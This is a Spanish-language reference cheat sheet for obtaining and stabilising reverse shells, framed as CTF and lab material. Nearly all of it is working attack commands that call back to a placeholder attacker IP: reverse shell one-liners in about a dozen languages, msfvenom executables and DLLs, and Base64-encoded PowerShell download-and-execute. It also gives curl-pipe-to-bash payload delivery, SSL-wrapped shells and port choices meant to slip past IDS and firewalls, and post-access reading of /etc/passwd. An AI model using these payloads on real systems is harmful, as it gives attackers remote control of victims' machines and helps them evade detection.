# Reverse Shell — Guía de Referencia
### Obtención y estabilización de shells · CTF & lab

> ⚠️ Uso exclusivo en entornos controlados (CTF, laboratorios, sistemas propios o con autorización explícita).

---

## Qué es una Reverse Shell

En una conexión normal, el cliente inicia la conexión hacia el servidor. En una **reverse shell** es al revés — la máquina objetivo (víctima) inicia una conexión hacia tu máquina (atacante), enviándote una shell interactiva.

```
Normal:     Atacante  ──────────────→  Objetivo
Reverse:    Atacante  ←──────────────  Objetivo
                      objetivo conecta
                      y envía su shell
```

**¿Por qué reverse y no bind shell?** — Una bind shell abre un puerto en el objetivo esperando conexión. Los firewalls bloquean conexiones entrantes al objetivo fácilmente. Las conexiones salientes del objetivo (reverse) son mucho menos filtradas, porque parecen tráfico normal hacia internet.

---

## Flujo básico

```
1. Atacante levanta un listener (nc -lvnp 4444)
2. Se ejecuta el payload en el objetivo (por RCE, upload, injection…)
3. El objetivo conecta de vuelta al atacante al puerto 4444
4. El atacante recibe la shell
5. Se estabiliza la shell para uso interactivo
```

> Siempre levantar el listener **antes** de ejecutar el payload. Si el listener no está activo cuando llega la conexión, se pierde.

---

## 01 · Listeners

### Netcat básico

```bash
nc -lvnp 4444

# Flags:
# -l  escuchar (listen)
# -v  verbose
# -n  no resolver DNS
# -p  puerto
```

### rlwrap — recomendado para Windows shells

```bash
rlwrap nc -lvnp 4444
```

**¿Por qué rlwrap?** — Añade historial de comandos y navegación con flechas a la shell recibida. Sin él, las shells de Windows son muy incómodas de usar.

### socat — listener con TTY completo desde el inicio

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**¿Por qué socat?** — Si el objetivo también tiene socat, la shell recibida ya tiene TTY completo sin necesidad de estabilizarla después.

### Metasploit — multi/handler

```bash
msfconsole

use exploit/multi/handler
set PAYLOAD linux/x64/shell/reverse_tcp     # o el payload correspondiente
set LHOST <tu_ip>
set LPORT 4444
run
```

**¿Por qué multi/handler?** — Necesario para recibir payloads generados con msfvenom. También permite upgradear a Meterpreter fácilmente.

---

## 02 · Reverse shells — Linux

### Bash

```bash
bash -i >& /dev/tcp/<tu_ip>/4444 0>&1

# Alternativa — más compatible
bash -c 'bash -i >& /dev/tcp/<tu_ip>/4444 0>&1'

# URL-encoded para inyección en parámetros GET
bash+-c+'bash+-i+>%26+/dev/tcp/<tu_ip>/4444+0>%261'
```

**¿Por qué funciona?** — Bash tiene soporte nativo para `/dev/tcp/host/puerto` como pseudo-dispositivo de red. Redirige stdin, stdout y stderr al socket TCP.

---

### sh

```bash
sh -i >& /dev/tcp/<tu_ip>/4444 0>&1

# Con exec
exec 5<>/dev/tcp/<tu_ip>/4444; cat <&5 | while read l; do $l 2>&5 >&5; done
```

---

### Python / Python3

```bash
# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<tu_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<tu_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Versión más legible (guardar en fichero y ejecutar)
import socket,subprocess,os
s=socket.socket()
s.connect(("<tu_ip>",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

---

### Netcat

```bash
# nc con -e (versiones que lo soportan)
nc <tu_ip> 4444 -e /bin/bash

# nc sin -e — usando mkfifo (la más compatible)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <tu_ip> 4444 >/tmp/f
```

**¿Por qué mkfifo?** — Las versiones modernas de netcat (ncat, openbsd-netcat) no incluyen `-e` por seguridad. mkfifo crea un pipe con nombre para redirigir stdin/stdout manualmente.

---

### Perl

```bash
perl -e 'use Socket;$i="<tu_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

---

### Ruby

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<tu_ip>","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

### PHP

```bash
# One-liner
php -r '$sock=fsockopen("<tu_ip>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# Webshell con reverse shell
php -r '$sock=fsockopen("<tu_ip>",4444);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

---

### Java

```bash
# Compilar y ejecutar
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<tu_ip>/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

### Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<tu_ip>:4444");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/shell.go
go run /tmp/shell.go
```

---

### Socat (objetivo con socat instalado)

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<tu_ip>:4444
```

**¿Por qué es mejor?** — Esta variante da directamente una shell con TTY completo, sin necesidad de estabilizar después. Es la más cómoda si socat está disponible en el objetivo.

---

### Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<tu_ip>/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

---

## 03 · Reverse shells — Windows 🪟

### PowerShell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<tu_ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Codificado en Base64 (para evadir detección básica)

```powershell
# Generar el payload codificado desde Linux
echo "IEX(New-Object Net.WebClient).downloadString('http://<tu_ip>/shell.ps1')" | iconv -t utf-16le | base64 -w 0

# Ejecutar en Windows
powershell -enc <BASE64>
```

---

### Netcat para Windows

```cmd
# Si nc.exe está disponible en el objetivo
nc.exe <tu_ip> 4444 -e cmd.exe

# Con rlwrap en el listener para mejor experiencia
rlwrap nc -lvnp 4444
```

---

### Msfvenom — generar ejecutable

```bash
# Payload básico — .exe
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=<tu_ip> LPORT=4444 \
         -f exe -o shell.exe

# Meterpreter — más funciones post-explotación
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=<tu_ip> LPORT=4444 \
         -f exe -o meter.exe

# Payload en PowerShell
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=<tu_ip> LPORT=4444 \
         -f psh -o shell.ps1

# Payload en DLL
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=<tu_ip> LPORT=4444 \
         -f dll -o shell.dll
```

**Listener para msfvenom:**

```
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST <tu_ip>
set LPORT 4444
run
```

---

### Python en Windows

```cmd
python -c "import socket,subprocess,os;s=socket.socket();s.connect(('<tu_ip>',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"
```

---

## 04 · Estabilización de shell

Una raw shell sin TTY no permite contraseñas interactivas, sudo, Ctrl+C, ni autocompletado. Es el paso que más se olvida y más falta hace.

### Método Python — el más común (Linux)

```bash
# 1 — en la shell recibida, spawnear PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# o si solo hay python2:
python -c 'import pty;pty.spawn("/bin/bash")'

# 2 — backgroundear la shell con Ctrl+Z

# 3 — en tu terminal local
stty raw -echo; fg

# 4 — una vez de vuelta en la shell remota
export TERM=xterm
export SHELL=bash

# Opcional — ajustar tamaño de terminal
stty rows 40 cols 160
```

**¿Qué hace cada paso?**
- `pty.spawn` — crea un pseudo-terminal en el objetivo
- `stty raw -echo` — deshabilita el procesamiento local de teclas para pasarlas directamente
- `fg` — recupera la shell backgroundeada
- `export TERM=xterm` — habilita colores y comandos como `clear`

---

### Método socat — el más limpio

```bash
# En tu máquina (listener con TTY completo desde el inicio)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# En el objetivo — si socat está disponible
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<tu_ip>:4444

# Si socat no está en el objetivo — transferirlo
# Desde tu máquina:
python3 -m http.server 8080
# En el objetivo:
wget http://<tu_ip>:8080/socat -O /tmp/socat && chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<tu_ip>:4444
```

---

### Método script — alternativa a Python

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

### Método rlwrap — para shells de Windows

```bash
# En tu listener — antes de recibir la shell
rlwrap nc -lvnp 4444

# Añade historial de comandos y flechas
# No da TTY completo pero hace la shell de Windows mucho más usable
```

---

## 05 · Transferencia del payload al objetivo

Para ejecutar el payload necesitas entregarlo al objetivo de alguna forma.

### Servidor HTTP rápido

```bash
# Python3
python3 -m http.server 8080

# Python2
python -m SimpleHTTPServer 8080
```

### Descargar en el objetivo

```bash
# Linux
wget http://<tu_ip>:8080/shell.sh -O /tmp/shell.sh
curl http://<tu_ip>:8080/shell.sh -o /tmp/shell.sh

# Ejecutar en memoria (sin escribir en disco)
curl http://<tu_ip>:8080/shell.sh | bash
wget -O- http://<tu_ip>:8080/shell.sh | bash
```

```cmd
# Windows
certutil -urlcache -f http://<tu_ip>:8080/shell.exe C:\Temp\shell.exe
powershell -c "IWR http://<tu_ip>:8080/shell.exe -OutFile C:\Temp\shell.exe"
```

---

## 06 · Evasión básica de detección

### Cambiar puerto — usar puertos comunes

```bash
# Puertos que suelen estar permitidos en firewalls salientes
nc -lvnp 80     # HTTP
nc -lvnp 443    # HTTPS
nc -lvnp 53     # DNS
nc -lvnp 8080   # HTTP alternativo
```

### Cifrado con socat (SSL)

```bash
# Generar certificado en tu máquina
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Listener cifrado
socat openssl-listen:4444,cert=cert.pem,key=key.pem,verify=0 file:`tty`,raw,echo=0

# Payload en el objetivo
socat openssl:<tu_ip>:4444,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

**¿Por qué cifrar?** — El tráfico sin cifrar es fácilmente detectable por IDS/IPS que inspeccionan el contenido. Con SSL parece tráfico HTTPS legítimo.

---

## 07 · Herramientas útiles

### revshells.com

Generador online de reverse shells en todos los lenguajes. Introduce tu IP, puerto y lenguaje y genera el payload listo para usar.

```
https://revshells.com
```

### PayloadsAllTheThings

Repositorio con payloads de reverse shell en docenas de lenguajes y contextos.

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

---

## Referencia rápida — payloads por lenguaje

| Lenguaje | Disponible en | Comando base |
|---|---|---|
| `bash` | Linux | `bash -i >& /dev/tcp/<ip>/4444 0>&1` |
| `sh` | Linux/Unix | `sh -i >& /dev/tcp/<ip>/4444 0>&1` |
| `python3` | Linux/Windows | `python3 -c 'import socket…'` |
| `nc (con -e)` | Linux | `nc <ip> 4444 -e /bin/bash` |
| `nc (sin -e)` | Linux | `mkfifo + pipe` |
| `perl` | Linux | `perl -e 'use Socket…'` |
| `ruby` | Linux | `ruby -rsocket -e '…'` |
| `php` | Web/Linux | `php -r '$sock=fsockopen…'` |
| `powershell` | Windows | `New-Object TCPClient…` |
| `nc.exe` | Windows | `nc.exe <ip> 4444 -e cmd.exe` |
| `socat` | Linux/Windows | `socat exec:'bash -li'…` |

---

## Flujo completo — de acceso a shell estable

```bash
# 1 — levantar listener (siempre primero)
rlwrap nc -lvnp 4444

# 2 — ejecutar payload en el objetivo
# (via RCE, command injection, upload, SSTI, etc.)
bash -c 'bash -i >& /dev/tcp/<tu_ip>/4444 0>&1'

# 3 — recibir la shell y estabilizarla
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# 4 — verificar contexto
id && whoami && hostname
cat /etc/passwd
sudo -l

# 5 — reconocimiento para privesc
find / -perm -4000 -type f 2>/dev/null
```

---

*Reverse Shell Reference — uso exclusivo en entornos autorizados · CTF / laboratorio*
*revshells.com · PayloadsAllTheThings · github.com/swisskyrepo*
